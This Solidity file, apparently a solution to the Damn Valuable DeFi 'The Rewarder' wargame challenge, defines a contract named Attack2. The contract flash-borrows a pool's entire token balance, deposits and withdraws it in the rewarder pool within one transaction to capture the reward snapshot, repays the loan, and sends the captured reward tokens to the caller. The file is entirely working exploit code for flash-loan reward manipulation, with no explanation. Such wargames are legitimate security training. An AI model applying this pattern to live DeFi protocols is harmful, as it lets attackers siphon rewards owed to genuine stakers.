// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";
import "./FlashLoanerPool.sol";
import "./RewardToken.sol";
import "./TheRewarderPool.sol";

contract Attack2 {
    using Address for address payable;
    DamnValuableToken liquidToken;
    FlashLoanerPool flashpool;
    RewardToken rewardToken;
    TheRewarderPool theRewarderPool;

    constructor(
        address acc,
        address flpool,
        address retoken,
        address therepool
    ) {
        liquidToken = DamnValuableToken(acc);
        flashpool = FlashLoanerPool(flpool);
        rewardToken = RewardToken(retoken);
        theRewarderPool = TheRewarderPool(therepool);
    }

    function attack() external {
        uint256 amount = liquidToken.balanceOf(address(flashpool));
        flashpool.flashLoan(amount);
        rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));
    }

    function receiveFlashLoan(uint256 amount) external payable {
        liquidToken.approve(address(theRewarderPool), amount);
        theRewarderPool.deposit(amount);
        theRewarderPool.withdraw(amount);
        liquidToken.transfer(address(flashpool), amount);
    }

    receive() external payable {}
}
